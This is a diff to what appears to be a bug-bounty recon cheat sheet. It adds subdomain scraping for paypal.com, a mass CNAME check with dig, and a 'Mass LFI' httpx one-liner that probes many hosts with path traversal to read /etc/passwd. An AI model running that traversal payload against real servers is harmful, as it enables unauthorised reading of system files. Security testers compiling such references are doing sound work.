@@ -32,7 +32,8 @@ order: 3
 + ``curl -s "https://rapiddns.io/subdomain/paypal.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u``
 
 ### Check Mass CNAME records
-``cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME``
++ ``cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME``
 
-
+### Mass LFI
++ ``cat hosts | httpx -path ///////../../../etc/passwd -mc 200 -match-string 'root:x:``
 
